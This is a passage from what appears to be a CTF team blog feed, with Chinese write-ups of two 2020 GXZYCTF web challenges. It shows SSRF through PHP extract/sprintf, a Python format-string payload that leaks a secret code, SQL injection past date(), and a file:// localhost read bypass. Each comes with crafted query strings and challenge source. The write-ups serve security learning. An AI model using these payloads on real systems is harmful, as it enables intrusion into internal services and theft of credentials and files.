href="https://www.php.net/manual/zh/function.sprintf" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.sprintf</a> 通过extract进行变量覆盖，覆盖begin为begin=%1$s，则<code>sprintf($begin.&#39;%d&#39;,$output);</code>处就可以输出，例如构造</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?head</span>=\&amp;begin=<span class="meta">%1</span><span class="variable">$s</span>&amp;url=www.baidu.com</span><br></pre></td></tr></table></figure><p>则可以返回baidu的内容，所以显然用来SSRF最合适不过，发现127.0.0.1还开了8080端口，所以构造</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\<span class="variable">&amp;begin</span>=%<span class="number">1</span>$s<span class="variable">&amp;url</span>=http:<span class="comment">//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309104345436.png" alt></p><p>也就是需要我们拿到vipcode，一通测试，python的格式化字符串问题，构造</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\&amp;begin=%1$s&amp;url=<span class="link">http://127.0.0.1:8080/read/file=&#123;file.__init__.__globals__</span>[<span class="string">vip</span>]._<span class="emphasis">_init_</span><span class="emphasis">_._</span><span class="emphasis">_globals_</span><span class="emphasis">_&#125;%26vipcode=xxx</span></span><br></pre></td></tr></table></figure><p>可以读取到vipcode</p><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105152178.png" alt></p><p>带上vipcode就可以为所欲为了</p><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105248654.png" alt></p><p>提示了flag所在的文件，结合题目提示，flag的路径就是/fl4g_1s_h3re_u_wi11_rua/flag，读取题目源码可以发现fl4g被过滤了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#readfile.py</span></span><br><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vip.py</span></span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        global vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span><span class="symbol">:</span></span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.truevipcode</span><br></pre></td></tr></table></figure><p>由于fl4g被过滤了，所以只能另辟蹊径，代码中</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">global</span> <span class="string">current_folder_file</span></span><br><span class="line"><span class="attr">try</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">os.listdir(self.path)</span></span><br><span class="line"><span class="attr">except</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">current_folder_file</span></span><br></pre></td></tr></table></figure><p>所以可以通过current_folder_file来获取flag文件夹，构造</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;vipfile.<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">current_folder_file</span>][<span class="symbol">21</span>]&#125;/flag</span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/0.png" alt>            </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;访问直接给了题目源码👇&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;head&#39;&lt;/span&gt;])&amp;amp;&amp;amp;&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $begin = &lt;span class=&quot;string&quot;&gt;&quot;The number you want: &quot;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    extract($_GET);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($head == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Where is your head?&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/[A-Za-z0-9]/i&#39;&lt;/span&gt;,$head))&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        die(&#39;Head can\&#39;t be like this!&#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(preg_match(&#39;/log/i&#39;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        die(&#39;No No No&#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(preg_match(&#39;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&#39;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Don\&#39;t use strange protocol!&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $funcname = $head.&lt;span class=&quot;string&quot;&gt;&#39;curl_init&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $ch = $funcname();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($ch)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_setopt($ch, CURLOPT_URL, $url);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_setopt($ch, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        $output = curl_exec($ch);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_close($ch);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        $output = &lt;span class=&quot;string&quot;&gt;&#39;rua&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; sprintf($begin.&lt;span class=&quot;string&quot;&gt;&#39;%d&#39;&lt;/span&gt;,$output);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_SSRF" scheme="https://boiteam.github.io/tags/Web-SSRF/"/>
    
      <category term="Web_python格式化字符串" scheme="https://boiteam.github.io/tags/Web-python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF eazytrick_gzmtu</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:29:57.952Z</updated>
    
    <content type="html"><![CDATA[<p>首先进入页面提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=Y 或者 Y=<span class="number">2020</span></span><br></pre></td></tr></table></figure><p>然后经过测试，发现这是经过date函数处理的，而绕过这个函数，只需要在每个字符前面添加反斜杠</p><p><img src="/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/1584694675(1).jpg" alt="1584694675(1)"></p><p>然后就是正常的SQL注入，基本没有过滤任何函数</p><p>得到数据库的内容为</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url： /eGlhb2xldW5n username： <span class="keyword">admin</span> <span class="keyword">password</span>： <span class="number">20200202</span>goodluck</span><br></pre></td></tr></table></figure><p>访问 /eGlhb2xldW5n，登录后台后存在文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:<span class="regexp">//</span>localhost<span class="regexp">/var/</span>www<span class="regexp">/html/i</span>ndex.php</span><br></pre></td></tr></table></figure><p>这儿使用file://localhost绕过本地</p><p>然后读取得到的源码为：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$time = date($_GET[<span class="string">'time'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from `content` where `createtime` = '$time' "</span>;</span><br><span class="line">$r = $conn-&gt;query($sql);</span><br><span class="line">$content = $r-&gt;fetch_array(MYSQL_ASSOC);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>eGlhb2xldW5n/check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include</span>(<span class="string">"../conn.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'login'</span>]))</span><br><span class="line">&#123;<span class="keyword">die</span>(<span class="string">'请登录!'</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">$parts = parse_url($url);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>) &#123;   </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'请从本地访问'</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|fl|la|ag|fla|lag|log/is"</span>, $parts[<span class="string">'path'</span>]))&#123;</span><br><span class="line">readfile($url);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">die</span>(<span class="string">'不要搞这些奇奇怪怪的东西。'</span>);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gf;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"> $number = 